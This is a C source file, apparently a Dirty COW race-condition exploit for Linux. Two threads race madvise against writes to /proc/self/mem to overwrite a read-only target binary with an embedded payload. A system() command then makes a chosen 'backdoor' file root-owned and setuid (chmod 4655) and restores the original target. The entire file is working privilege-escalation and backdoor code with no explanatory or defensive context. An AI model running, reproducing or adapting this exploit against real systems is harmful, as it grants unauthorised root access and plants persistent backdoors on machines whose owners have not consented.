#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "a.out.h"

#define BACKUP_PATH	"./.back"
#ifndef ALLPERMS
# define ALLPERMS (S_ISUID|S_ISGID|S_ISVTX|S_IRWXU|S_IRWXG|S_IRWXO)
#endif

void *thread_madvise(void *map)
{
	int i;

	for(i = 0; i < 10000; i++) {
		madvise(map, 100, MADV_DONTNEED);
	}
	return NULL;
}

void *thread_procselfmem(void *map)
{
	int i;
	int f;

	f = open("/proc/self/mem", O_RDWR);
	for(i = 0; i < 10000; i++) {
		lseek(f, (off_t) map, SEEK_SET);
		write(f, __a_out, __a_out_len);
	}
	close(f);
	return NULL;
}

int create_backdoor(const char *path)
{
	int f;

	f = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0655);
	if (f < 0) {
		return -1;
	}
	write(f, __a_out, __a_out_len);
	close(f);
}

int backup_target(const char *path)
{
	int target;
	int backup;
	ssize_t nb;
	char buf[4096];

	target = open(path, O_RDONLY);
	if (target < 0) {
		return -1;
	}
	backup = open(BACKUP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0655);
	if (backup < 0) {
		close(target);
		return -1;
	}
	while ((nb = read(target, buf, sizeof(buf))) > 0) {
		write(backup, buf, nb);
	}
	close(target);
	close(backup);
	return 0;
}

int verify_exploit(const char *path)
{
	int target;
	void *map;
	int ret = - 1;

	target = open(path,O_RDONLY);
	map = mmap(NULL, __a_out_len, PROT_READ, MAP_PRIVATE, target, 0);
	if (memcmp(map, __a_out, __a_out_len) == 0) {
		ret = 0;
	}
	close(target);
	munmap(map, __a_out_len);
	return ret;
}

int main(int argc, char **argv)
{
	void *map;
	int target;
	int target_perm;
	ssize_t size;
	pthread_t t1;
	pthread_t t2;
	struct stat st;
	char commands[4096];
	const char *target_path;
	const char *backdoor_path;

	if (argc < 3) {
		printf("%s <target> <backdoor>\n", argv[0]);
		return -1;
	}
	target_path = argv[1];
	backdoor_path = argv[2];
	target = open(target_path,O_RDONLY);
	if (target < 0) {
		printf("Could not open target.\n");
		return -1;
	}
	fstat(target, &st);
	target_perm = st.st_mode;
	size = st.st_size;
	if (size < __a_out_len) {
		printf("Target size is too small.\n");
		close(target);
		return -1;
	}
	if (backup_target(target_path) != 0) {
		printf("Failed to backup target.\n");
		close(target);
		return -1;
	}
	if (create_backdoor(backdoor_path) != 0) {
		printf("Could not create backdoor.\n");
		close(target);
		return -1;
	}
	map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, target, 0);
	pthread_create(&t1, 0, &thread_madvise, map);
	pthread_create(&t2, 0, &thread_procselfmem, map);
	pthread_join(t1, NULL);
	pthread_join(t2, NULL);
	mlock(map, size);
	msync(map, size, MS_SYNC);
	if (verify_exploit(target_path) != 0) {
		close(target);
		munmap(map, size);
		printf("failed.\n");
		return -1;
	}
	snprintf(commands,
		 sizeof(commands),
		 "echo \"rm -f %s && chown root:root %s && chmod 4655 %s && mv %s %s && chown root:root %s && chmod %o %s\" | %s",
		 target_path,
		 backdoor_path,
		 backdoor_path,
		 BACKUP_PATH,
		 target_path,
		 target_path,
		 ALLPERMS & target_perm,
		 target_path,
		 target_path
	);
	system(commands);
	munlock(map, size);
	munmap(map, st.st_size);
	close(target);
	printf("done.\n");
	return 0;
}
